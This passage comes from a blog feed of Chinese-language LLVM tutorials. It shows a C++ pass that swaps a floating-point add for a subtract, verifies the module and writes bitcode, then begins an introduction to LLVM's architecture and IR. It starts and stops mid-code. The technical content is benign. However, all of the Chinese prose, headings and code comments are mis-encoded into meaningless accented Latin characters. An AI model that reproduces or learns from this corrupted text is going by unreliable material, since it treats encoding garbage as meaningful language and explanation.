class="token operator">=</span> <span class="token operator">&amp;</span>it<span class="token operator">-></span><span class="token function">getInstList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">auto</span> inst <span class="token operator">=</span> instl<span class="token operator">-></span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> inst <span class="token operator">!=</span> instl<span class="token operator">-></span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>inst<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>inst<span class="token operator">-></span><span class="token function">isBinaryOp</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> inst<span class="token operator">-></span><span class="token function">getOpcode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> Instruction<span class="token double-colon punctuation">::</span>FAdd <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                new_inst <span class="token operator">=</span> <span class="token class-name">BinaryOperator</span><span class="token double-colon punctuation">::</span><span class="token function">CreateFSub</span><span class="token punctuation">(</span>                inst<span class="token operator">-></span><span class="token function">getOperand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                inst<span class="token operator">-></span><span class="token function">getOperand</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                old_inst <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token operator">*</span>inst<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * #include "llvm/Transforms/Utils/BasicBlockUtils.h"     * 2022-05-02 11:49:30     * æŒ‡ä»¤æ›¿æ¢     * */</span>    <span class="token function">outs</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span><span class="token string">" new op: "</span><span class="token operator">&lt;&lt;</span> <span class="token operator">*</span>new_inst<span class="token operator">&lt;&lt;</span><span class="token string">" \n"</span><span class="token punctuation">;</span>    <span class="token function">outs</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span><span class="token string">" old op: "</span><span class="token operator">&lt;&lt;</span> <span class="token operator">*</span>old_inst <span class="token operator">&lt;&lt;</span> <span class="token string">" \n"</span><span class="token punctuation">;</span>    <span class="token function">outs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token string">"before replace InstructionCount(): "</span> <span class="token operator">&lt;&lt;</span>main_fn<span class="token operator">-></span><span class="token function">getInstructionCount</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token string">"\n"</span><span class="token punctuation">;</span>    <span class="token function">ReplaceInstWithInst</span><span class="token punctuation">(</span>old_inst<span class="token punctuation">,</span>new_inst<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">outs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token string">"after replace InstructionCount(): "</span> <span class="token operator">&lt;&lt;</span>main_fn<span class="token operator">-></span><span class="token function">getInstructionCount</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token string">"\n"</span><span class="token punctuation">;</span>    <span class="token comment">/**     * #include "llvm/IR/Verifier.h"     * 2022-05-02 11:43:34     * ä¿®æ”¹å®ŒModuleåè¿›è¡ŒéªŒè¯Moduleçš„å®Œæ•´æ€§     * verifyModule(*M,&amp;errs()): true if the module is broken.      * */</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>llvm<span class="token double-colon punctuation">::</span><span class="token function">verifyModule</span><span class="token punctuation">(</span><span class="token operator">*</span>M<span class="token punctuation">,</span><span class="token operator">&amp;</span><span class="token function">errs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">outs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token string">"verify is ok \n"</span><span class="token punctuation">;</span>        M<span class="token operator">-></span><span class="token function">print</span><span class="token punctuation">(</span><span class="token function">outs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">nullptr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * #include "llvm/Bitcode/BitcodeWriter.h"     * 2022-05-02 12:11:57     * å°†ä¿®æ”¹åçš„IR å­˜å‚¨åˆ°æ–‡ä»¶ä¸­ï¼Œ æ‰§è¡Œ     * */</span>    std<span class="token double-colon punctuation">::</span>error_code EC<span class="token punctuation">;</span>    llvm<span class="token double-colon punctuation">::</span>raw_fd_ostream <span class="token function">OS</span><span class="token punctuation">(</span><span class="token string">"aftermain.bc"</span><span class="token punctuation">,</span> EC<span class="token punctuation">,</span>llvm<span class="token double-colon punctuation">::</span>sys<span class="token double-colon punctuation">::</span>fs<span class="token double-colon punctuation">::</span><span class="token function">OpenFlags</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    llvm<span class="token double-colon punctuation">::</span><span class="token function">WriteBitcodeToFile</span><span class="token punctuation">(</span><span class="token operator">*</span>M<span class="token punctuation">,</span>OS<span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    OS<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="2-7-æ•ˆæœ">2.7) æ•ˆæœ</h3><p><img src="https://s2.loli.net/2022/05/02/XL6jYW3ExnNvBSc.png" class="lazyload" data-srcset="https://s2.loli.net/2022/05/02/XL6jYW3ExnNvBSc.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220502120500759"></p><p><img src="https://s2.loli.net/2022/05/02/j7hGV659Dwg2UXJ.png" class="lazyload" data-srcset="https://s2.loli.net/2022/05/02/j7hGV659Dwg2UXJ.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220502120522500"></p><p><img src="https://s2.loli.net/2022/05/03/kbUIrLcsJei1Rfp.png" class="lazyload" data-srcset="https://s2.loli.net/2022/05/03/kbUIrLcsJei1Rfp.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220503160351943"></p></div><h2 id="ä¸‰-æ€»ç»“">ä¸‰) æ€»ç»“</h2><div class="story post-story"><p><strong>æŒ‡ä»¤æ“ä½œ</strong></p><p>æ ¸å¿ƒæ˜¯é¦–å…ˆè¦æ‰¾åˆ°å¯¹åº”çš„æŒ‡ä»¤æ‰€åœ¨çš„ä½ç½®ï¼›</p><p>æ„å»ºæ–°çš„æŒ‡ä»¤ï¼Œæ›¿æ¢æ‰åŸæ¥çš„æŒ‡ä»¤æ“ä½œï¼Œ</p><p>aï¼‰æ„å»ºæ–°çš„æ“ä½œæŒ‡ä»¤ä½¿ç”¨<code>BinaryOperator::CreateXXX</code> <font color='cornflowerblue'>ä¸éœ€è¦æŒ‡å®šæ’å…¥ä½ç½®</font></p><pre><code>å¦‚æœä½¿ç”¨`BinaryOperator::Create`&lt;font color='cornflowerblue'&gt;åˆ™éœ€è¦æŒ‡å®šæ’å…¥ä½ç½®&lt;/font&gt;</code></pre><p>bï¼‰æ›¿æ¢æŒ‡ä»¤æ“ä½œä½¿ç”¨<code>ReplaceInstWithInst()</code></p><pre><code>è®¾è®¡å¤´æ–‡ä»¶`&quot;llvm/Transforms/Utils/BasicBlockUtils.h&quot;`ç›¸åº”çš„æ›¿æ¢æ“ä½œè¿˜æœ‰å¾ˆå¤šï¼Œ åƒ`ReplaceInstWithValue`</code></pre><p>cï¼‰å°†ä¿®æ”¹åçš„æ–‡ä»¶ä»¥<code>bitcode</code>å½¢å¼å­˜æ”¾åˆ°æ–‡ä»¶ä¸­ï¼Œ å†™å…¥ä¹‹å‰æœ€å¥½è¿›è¡Œ<code>Module</code>çš„éªŒè¯</p><p>è¿™ä¸ªè¿‡ç¨‹ä¸­æ¶‰åŠåˆ°ï¼š</p><pre><code>1. æ–‡ä»¶è¯»å…¥åˆ°Moduleç±»ï¼›2. è¿­ä»£å™¨çš„ä½¿ç”¨3. è·å–æŒ‡ä»¤çš„æ“ä½œæ•°4. åˆ›å»ºæ–°çš„æŒ‡ä»¤5. æŒ‡ä»¤æ›¿æ¢6. ModuleéªŒè¯7. å†™å…¥æ–‡ä»¶</code></pre></div>]]></content>
      
      
      <categories>
          
          <category> Master </category>
          
          <category> LLVM </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fuzzing </tag>
            
            <tag> LLVM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LLVM å­¦ä¹ (ä¸€) åˆè¯†LLVM</title>
      <link href="/posts/69383cde/"/>
      <url>/posts/69383cde/</url>
      
        <content type="html"><![CDATA[<h1>LLVM å­¦ä¹ (ä¸€) åˆè¯†LLVM</h1><blockquote><p>@2022-04-16 10:09:06</p><p>@sizaif</p><p><img src="Q:/whx/Dropbox/Master/Blog/blog/source/_posts/img_article/2022-04-20-LLVM-%E5%AD%A6%E4%B9%A0-%E4%B8%80-%E5%88%9D%E8%AF%86LLVM/fuSeLF4G7Kpti1Q.png" class="lazyload" data-srcset="Q:/whx/Dropbox/Master/Blog/blog/source/_posts/img_article/2022-04-20-LLVM-%E5%AD%A6%E4%B9%A0-%E4%B8%80-%E5%88%9D%E8%AF%86LLVM/fuSeLF4G7Kpti1Q.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="img"></p></blockquote><h2 id="LLVMå®‰è£…-ç¯å¢ƒæ­å»º">LLVMå®‰è£…&amp;ç¯å¢ƒæ­å»º</h2><div class="story post-story"><ol><li>å®˜ç½‘ä¸‹è½½é¢„ç¼–è¯‘çš„äºŒè¿›åˆ¶æ–‡ä»¶</li><li>ä¿®æ”¹ç¯å¢ƒå˜é‡æŒ‡å‘ <code>export PATH=&quot;$PATH:/usr/local/clang+llvm/bin&quot;</code></li><li>æ£€æŸ¥ä½¿ç”¨</li></ol><pre class="language-bash" data-language="bash"><code class="language-bash">root@0187031113b5:/home/workhome<span class="token comment"># env | grep PATH</span><span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span>/usr/local/clang+llvm/bin:/root/.cargo/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binroot@0187031113b5:/home/workhome<span class="token comment"># clang --version</span>clang version <span class="token number">14.0</span>.0Target: x86_64-unknown-linux-gnuThread model: posixInstalledDir: /usr/local/clang+llvm/binroot@0187031113b5:/home/workhome<span class="token comment"># llvm-as --version</span>LLVM <span class="token punctuation">(</span>http://llvm.org/<span class="token punctuation">)</span>:  LLVM version <span class="token number">14.0</span>.0  Optimized build.  Default target: x86_64-unknown-linux-gnu  Host CPU: skylakeroot@0187031113b5:/home/workhome<span class="token comment"># </span></code></pre></div><h2 id="LLVMæ¶æ„">LLVMæ¶æ„</h2><div class="story post-story"><ul><li>ä½¿ç”¨å¯é‡ç”¨çš„ç»„ä»¶æ„å»ºçš„æ–°çš„ç¼–è¯‘å™¨ä½“ç³»ç»“æ„</li><li>å°†ç°æœ‰è¯­è¨€é‡æ–°è®¾ç½®åˆ°JITæˆ–é™æ€ç¼–è¯‘</li></ul><p><img src="Q:/whx/Dropbox/Master/Blog/blog/source/_posts/img_article/2022-04-20-LLVM-%E5%AD%A6%E4%B9%A0-%E4%B8%80-%E5%88%9D%E8%AF%86LLVM/vNYqnDUJS3z6b4O.png" class="lazyload" data-srcset="Q:/whx/Dropbox/Master/Blog/blog/source/_posts/img_article/2022-04-20-LLVM-%E5%AD%A6%E4%B9%A0-%E4%B8%80-%E5%88%9D%E8%AF%86LLVM/vNYqnDUJS3z6b4O.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220416110553226"></p><p>å…¶ä¸»è¦ç»„ä»¶æ˜¯å‰ç«¯ï¼Œä¼˜åŒ–å™¨å’Œåç«¯ã€‚å‰ç«¯è§£ææºä»£ç ï¼Œæ£€æŸ¥å…¶é”™è¯¯ï¼Œå¹¶æ„å»ºç‰¹å®šäºè¯­è¨€çš„æŠ½è±¡è¯­æ³•æ ‘ï¼ˆASTï¼‰ä»¥è¡¨ç¤ºè¾“å…¥ä»£ç ã€‚ASTå¯é€‰åœ°å°†å…¶è½¬æ¢ä¸ºæ–°çš„ä¼˜åŒ–è¡¨ç¤ºï¼Œå¹¶ä¸”ä¼˜åŒ–å™¨å’Œåç«¯åœ¨ä»£ç ä¸Šè¿è¡Œã€‚</p><p>ä¼˜åŒ–å™¨è´Ÿè´£è¿›è¡Œå„ç§å„æ ·çš„è½¬æ¢ï¼Œä»¥æ”¹è¿›ä»£ç çš„è¿è¡Œæ—¶é—´ï¼Œä¾‹å¦‚æ¶ˆé™¤å†—ä½™è®¡ç®—ï¼Œå¹¶ä¸”é€šå¸¸æˆ–å¤šæˆ–å°‘åœ°ç‹¬ç«‹äºè¯­è¨€å’Œç›®æ ‡ã€‚</p><p>åç«¯(ä¹Ÿç§°ä¸ºä»£ç ç”Ÿæˆå™¨)ç„¶åå°†ä»£ç æ˜ å°„åˆ°ç›®æ ‡æŒ‡ä»¤é›†ã€‚é™¤äº†ç¼–å†™æ­£ç¡®çš„ä»£ç å¤–ï¼Œå®ƒè¿˜è´Ÿè´£ç”Ÿæˆåˆ©ç”¨å—æ”¯æŒä½“ç³»ç»“æ„çš„ç‰¹æ®Šç‰¹æ€§çš„å¥½ä»£ç ã€‚ç¼–è¯‘å™¨åç«¯çš„å…¬å…±éƒ¨åˆ†åŒ…æ‹¬æŒ‡ä»¤é€‰æ‹©ã€å¯„å­˜å™¨åˆ†é…å’ŒæŒ‡ä»¤è°ƒåº¦ã€‚</p><p><strong>LLVMçš„è®¾è®¡æ¶æ„</strong></p><p><img src="Q:/whx/Dropbox/Master/Blog/blog/source/_posts/img_article/2022-04-20-LLVM-%E5%AD%A6%E4%B9%A0-%E4%B8%80-%E5%88%9D%E8%AF%86LLVM/x6RElfdkJKTzbwg.png" class="lazyload" data-srcset="Q:/whx/Dropbox/Master/Blog/blog/source/_posts/img_article/2022-04-20-LLVM-%E5%AD%A6%E4%B9%A0-%E4%B8%80-%E5%88%9D%E8%AF%86LLVM/x6RElfdkJKTzbwg.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220416115305489"></p><p>æ”¯æŒä¸€ç§æ–°çš„ç¼–ç¨‹è¯­è¨€åªéœ€é‡æ–°å®ç°ä¸€ä¸ªå‰ç«¯ï¼Œæ”¯æŒä¸€ç§æ–°çš„ç›®æ ‡æ¶æ„åªéœ€é‡æ–°å®ç°ä¸€ä¸ªåç«¯ï¼Œå‰ç«¯å’Œåç«¯è¿æ¥æ¢çº½å°±æ˜¯LLVM IRã€‚</p><h3 id="LLVMçš„å«ä¹‰">LLVMçš„å«ä¹‰</h3><p>åœ¨ä¸åŒçš„è¯­ä¹‰ç¯å¢ƒä¸‹ï¼ŒLLVMå…·æœ‰ä»¥ä¸‹å‡ ç§ä¸åŒçš„å«ä¹‰ï¼š</p><ul><li>LLVMåŸºç¡€æ¶æ„ï¼šå³ä¸€ä¸ªå®Œæ•´ç¼–è¯‘å™¨é¡¹ç›®çš„é›†åˆï¼ŒåŒ…æ‹¬ä½†ä¸é™äºå‰ç«¯ã€åç«¯ã€ä¼˜åŒ–å™¨ã€æ±‡ç¼–å™¨ã€é“¾æ¥å™¨ã€libcppæ ‡å‡†åº“ã€Compiler-RTå’ŒJITå¼•æ“</li><li>åŸºäºLLVMæ„å»ºçš„ç¼–è¯‘å™¨ï¼šéƒ¨åˆ†æˆ–å®Œå…¨ä½¿ç”¨LLVMæ„å»ºçš„ç¼–è¯‘å™¨</li><li>LLVMåº“ï¼šLLVMåŸºç¡€æ¶æ„å¯é‡ç”¨ä»£ç éƒ¨åˆ†</li><li>LLVMæ ¸å¿ƒï¼šåœ¨LLVM IRä¸Šè¿›è¡Œçš„ä¼˜åŒ–å’Œåç«¯ç®—æ³•</li><li>LLVM IRï¼šLLVMä¸­é—´è¡¨ç¤º</li></ul><h3 id="LLVMåŸºç¡€æ¶æ„çš„ç»„æˆéƒ¨åˆ†">LLVMåŸºç¡€æ¶æ„çš„ç»„æˆéƒ¨åˆ†</h3><ul><li>å‰ç«¯ï¼šå°†ç¨‹åºæºä»£ç è½¬æ¢ä¸ºLLVM IRçš„ç¼–è¯‘å™¨æ­¥éª¤ï¼ŒåŒ…æ‹¬è¯æ³•åˆ†æå™¨ã€è¯­æ³•åˆ†æå™¨ã€è¯­ä¹‰åˆ†æå™¨ã€LLVM IRç”Ÿæˆå™¨ã€‚Clangæ‰§è¡Œäº†æ‰€æœ‰ä¸å‰ç«¯ç›¸å…³çš„æ­¥éª¤ï¼Œå¹¶æä¾›äº†ä¸€ä¸ªæ’ä»¶æ¥å£å’Œä¸€ä¸ªå•ç‹¬çš„é™æ€åˆ†æå·¥å…·æ¥è¿›è¡Œæ›´æ·±å…¥çš„åˆ†æ</li><li>ä¸­é—´è¡¨ç¤ºï¼šLLVM IRå¯ä»¥ä»¥å¯è¯»æ–‡æœ¬ä»£ç å’ŒäºŒè¿›åˆ¶ä»£ç ä¸¤ç§å½¢å¼å‘ˆç°ã€‚LLVMåº“ä¸­æä¾›äº†å¯¹IRè¿›è¡Œæ„é€ ã€ç»„è£…å’Œæ‹†å¸çš„æ¥å£ã€‚LLVMä¼˜åŒ–å™¨ä¹Ÿåœ¨IRä¸Šè¿›è¡Œæ“ä½œï¼Œå¹¶åœ¨IRä¸Šè¿›è¡Œäº†å¤§éƒ¨åˆ†ä¼˜åŒ–ã€‚</li><li>åç«¯ï¼šè´Ÿè´£æ±‡ç¼–ç æˆ–æœºå™¨ç ç”Ÿæˆçš„æ­¥éª¤ï¼Œå°†LLVM IRè½¬æ¢ä¸ºç‰¹å®šæœºå™¨æ¶æ„çš„æ±‡ç¼–ä»£ç æˆ–è€ŒäºŒè¿›åˆ¶ä»£ç ï¼ŒåŒ…æ‹¬å¯„å­˜å™¨åˆ†é…ã€å¾ªç¯è½¬æ¢ã€çª¥è§†å­”ä¼˜åŒ–å™¨ã€ç‰¹å®šæœºå™¨æ¶æ„çš„ä¼˜åŒ–å’Œè½¬æ¢ç­‰æ­¥éª¤</li></ul><p>ä¸‹é¢è¿™å¼ å›¾å±•ç¤ºäº†ä½¿ç”¨LLVMåŸºç¡€æ¶æ„æ—¶å„ä¸ªç»„ä»¶ä¹‹é—´çš„å…³ç³»</p><p><img src="Q:/whx/Dropbox/Master/Blog/blog/source/_posts/img_article/2022-04-20-LLVM-%E5%AD%A6%E4%B9%A0-%E4%B8%80-%E5%88%9D%E8%AF%86LLVM/tVBO9sH5lkETcXP.jpg" class="lazyload" data-srcset="Q:/whx/Dropbox/Master/Blog/blog/source/_posts/img_article/2022-04-20-LLVM-%E5%AD%A6%E4%B9%A0-%E4%B8%80-%E5%88%9D%E8%AF%86LLVM/tVBO9sH5lkETcXP.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="img"></p><p>é™¤æ­¤ä¹‹å¤–ï¼Œå„ä¸ªç»„ä»¶ä¹‹é—´çš„åä½œå…³ç³»ä¹Ÿå¯ä»¥ä»¥ä¸‹é¢è¿™ç§æ–¹å¼ç»„ç»‡</p><p><img src="Q:/whx/Dropbox/Master/Blog/blog/source/_posts/img_article/2022-04-20-LLVM-%E5%AD%A6%E4%B9%A0-%E4%B8%80-%E5%88%9D%E8%AF%86LLVM/BFOnctdNR8XQixP.png" class="lazyload" data-srcset="Q:/whx/Dropbox/Master/Blog/blog/source/_posts/img_article/2022-04-20-LLVM-%E5%AD%A6%E4%B9%A0-%E4%B8%80-%E5%88%9D%E8%AF%86LLVM/BFOnctdNR8XQixP.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="img"></p><blockquote><p>ä¸¤ç§æ–¹å¼çš„ä¸»è¦åŒºåˆ«æ˜¯ç¨‹åºæºä»£ç å†…éƒ¨çš„é“¾æ¥æ˜¯ç”±LLVMæˆ–ç³»ç»Ÿé“¾æ¥å™¨å®Œæˆçš„è¿˜æ˜¯ç”±LLVM IRé“¾æ¥å™¨å®Œæˆçš„ï¼Œå‰è€…æ˜¯é»˜è®¤æ–¹å¼ï¼Œåè€…ä¸€èˆ¬åœ¨å¼€å¯é“¾æ¥ä¼˜åŒ–ï¼ˆLink-Time Optimizationï¼‰æ—¶é‡‡ç”¨</p></blockquote><p><strong>LLVM GCC 4.2 è®¾è®¡</strong></p><p><img src="Q:/whx/Dropbox/Master/Blog/blog/source/_posts/img_article/2022-04-20-LLVM-%E5%AD%A6%E4%B9%A0-%E4%B8%80-%E5%88%9D%E8%AF%86LLVM/kqZd4AH1me6STsV-16504536539906.png" class="lazyload" data-srcset="Q:/whx/Dropbox/Master/Blog/blog/source/_posts/img_article/2022-04-20-LLVM-%E5%AD%A6%E4%B9%A0-%E4%B8%80-%E5%88%9D%E8%AF%86LLVM/kqZd4AH1me6STsV-16504536539906.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220416104203344"></p><p><strong>é“¾æ¥LLVMå’ŒGCCç¼–è¯‘çš„ä»£ç </strong></p><ul><li>å¯ä»¥å®‰å…¨åœ°åœ¨ç¼–è¯‘å™¨ä¹‹é—´æ··åˆå’ŒåŒ¹é….oæ–‡ä»¶</li><li>å¯ä»¥å®‰å…¨åœ°è°ƒç”¨åˆ°ä¸å…¶ä»–ç¼–è¯‘å™¨ä¸€èµ·æ„å»ºçš„åº“ä¸­</li></ul><p><img src="Q:/whx/Dropbox/Master/Blog/blog/source/_posts/img_article/2022-04-20-LLVM-%E5%AD%A6%E4%B9%A0-%E4%B8%80-%E5%88%9D%E8%AF%86LLVM/LsXzEnF9Jx7OMov.png" class="lazyload" data-srcset="Q:/whx/Dropbox/Master/Blog/blog/source/_posts/img_article/2022-04-20-LLVM-%E5%AD%A6%E4%B9%A0-%E4%B8%80-%E5%88%9D%E8%AF%86LLVM/LsXzEnF9Jx7OMov.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220416104552625"></p><p><strong>é“¾æ¥æ—¶é—´ä¼˜åŒ–</strong></p><ul><li>ä½¿ç”¨-O4å¯¹æ–‡ä»¶è¿›è¡Œä¼˜åŒ–ï¼ˆä¾‹å¦‚å†…è”ã€å›ºå®šæŠ˜å ç­‰ï¼‰</li><li>å¯ä»¥è·¨è¯­è¨€è¾¹ç•Œè¿›è¡Œä¼˜åŒ–</li></ul><p><img src="Q:/whx/Dropbox/Master/Blog/blog/source/_posts/img_article/2022-04-20-LLVM-%E5%AD%A6%E4%B9%A0-%E4%B8%80-%E5%88%9D%E8%AF%86LLVM/3RM8CHeXasEdowg-16504536539908.png" class="lazyload" data-srcset="Q:/whx/Dropbox/Master/Blog/blog/source/_posts/img_article/2022-04-20-LLVM-%E5%AD%A6%E4%B9%A0-%E4%B8%80-%E5%88%9D%E8%AF%86LLVM/3RM8CHeXasEdowg-16504536539908.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220416105357043"></p><h3 id="LLVMä¸­é—´æ•°æ®ç»“æ„">LLVMä¸­é—´æ•°æ®ç»“æ„</h3><p>åœ¨LLVMä¸­å¹¶ä¸åªå­˜åœ¨LLVM IRä¸€ç§ä¸­é—´è¡¨ç°å½¢å¼ï¼ŒLLVMåœ¨ä¸åŒç¼–è¯‘é˜¶æ®µé‡‡ç”¨ä»¥ä¸‹ä¸åŒçš„ä¸­é—´æ•°æ®ç»“æ„ï¼š</p><ul><li>LLVM IRï¼š</li><li>æŠ½è±¡è¯­æ³•æ ‘ï¼ˆASTï¼‰ï¼šå°†æºä»£ç è½¬æ¢ä¸ºLLVM IRæ—¶ï¼ŒClangå‰ç«¯è¯­æ³•åˆ†æå™¨å’Œè¯­ä¹‰åˆ†æå™¨çš„äº§å‡ºæ•°æ®ç»“æ„</li><li>æœ‰å‘æ— ç¯å›¾ï¼ˆDAGï¼‰ï¼šå°†LLVM IRè½¬æ¢ä¸ºç‰¹å®šæœºå™¨æ¶æ„çš„æ±‡ç¼–ä»£ç æ—¶ï¼ŒLLVMé¦–å…ˆå°†å…¶è½¬æ¢ä¸ºæœ‰å‘æ— ç¯å›¾ï¼ˆDAGï¼‰çš„å½¢å¼ï¼Œä»¥æ–¹ä¾¿è¿›è¡ŒæŒ‡ä»¤é€‰æ‹©ï¼Œç„¶åå°†å…¶è½¬æ¢å›ä¸‰åœ°å€ç çš„å½¢å¼ä»¥è¿›è¡ŒæŒ‡ä»¤è°ƒåº¦</li><li>MCModuleç±»ï¼šä¸ºäº†å®ç°æ±‡ç¼–å™¨å’Œé“¾æ¥å™¨ï¼ŒLLVMä½¿ç”¨MCModuleç±»å°†ç¨‹åºè¡¨ç¤ºä¿å­˜åœ¨å¯¹è±¡æ–‡ä»¶ï¼ˆå¯é‡å®šå‘æ–‡ä»¶çš„ä¸€ç§ï¼Œé€šå¸¸æ–‡ä»¶åä»¥.oç»“å°¾ï¼‰çš„ä¸Šä¸‹æ–‡ä¸­</li></ul><p>ä¸åŒç¼–è¯‘é˜¶æ®µçš„ä¸­é—´æ•°æ®ç»“æ„æœ‰ä»¥ä¸‹ä¸¤ç§å­˜åœ¨æ–¹å¼ï¼š</p><ul><li>å†…å­˜ä¸­ï¼šéœ€è¦ç¼–è¯‘é©±åŠ¨ç¨‹åºçš„å¸®åŠ©ï¼Œå°†ä¸€ä¸ªé˜¶æ®µçš„è¾“å‡ºæ•°æ®ç»“æ„ä½œä¸ºä¸‹ä¸€ä¸ªé˜¶æ®µçš„è¾“å…¥æ•°æ®ç»“æ„</li><li>æ–‡ä»¶ä¸­ï¼šç‹¬ç«‹å‘½ä»¤ä¹‹é—´å¤šæ•°ä»¥æ–‡ä»¶ä¸ºåª’ä»‹è¿›è¡Œäº¤äº’ï¼Œæ¯”å¦‚æ±‡ç¼–å™¨ä¸é“¾æ¥å™¨é€šè¿‡å¯é‡å®šå‘çš„<code>.o</code>å¯¹è±¡æ–‡ä»¶è¿›è¡Œäº¤äº’</li></ul></div><h2 id="LLVM-IR">LLVM IR</h2><div class="story post-story"><p>(Intermediate Representationï¼ŒIR)</p><p>LLVMçš„ä¸­é—´è¡¨ç¤ºï¼Œæœ¬è´¨ä¸Šä¸€ç§ä¸æºç¼–ç¨‹è¯­è¨€å’Œç›®æ ‡æœºå™¨æ¶æ„æ— å…³çš„é€šç”¨ä¸­é—´è¡¨ç¤º</p><blockquote><p>LLVM IRæ˜¯ä¸€ç§ç±»ä¼¼äºRISCçš„ä½çº§è™šæ‹ŸæŒ‡ä»¤é›†</p></blockquote><p>LLVMæ˜¯ä½¿ç”¨ç®€å•ç±»å‹ç³»ç»Ÿçš„å¼ºç±»å‹(ä¾‹å¦‚ï¼Œ<code>i32</code>æ˜¯ä¸€ä¸ª32ä½æ•´æ•°ï¼Œ<code>i32**</code> æ˜¯æŒ‡å‘32ä½æ•´æ•°çš„æŒ‡é’ˆ)</p><p>LLVM IR ä¸ä½¿ç”¨ä¸€ç»„å›ºå®šçš„å‘½åå¯„å­˜å™¨,å®ƒä½¿ç”¨ä¸€ä¸ªåä¸º%å­—ç¬¦çš„æ— é™ä¸´æ—¶é›†åˆ</p><p>LLVM IRä»£è¢«è®¾è®¡æˆä¸‰ç§ä¸åŒçš„å½¢å¼:å†…å­˜ç¼–è¯‘å™¨IRï¼Œç£ç›˜äºŒè¿›åˆ¶<code>.bc</code>è¡¨ç¤º(é€‚åˆäºå³æ—¶ç¼–è¯‘å™¨çš„å¿«é€ŸåŠ è½½)ï¼Œå¯è¯»çš„æ±‡ç¼–è¯­è¨€<code>.ll</code></p><p><code>c</code>ä»£ç </p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token function">add1</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> a<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> b<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> a<span class="token operator">+</span>b<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// Perhaps not the most efficient way to add two numbers.</span><span class="token keyword">unsigned</span> <span class="token function">add2</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> a<span class="token punctuation">,</span> <span class="token 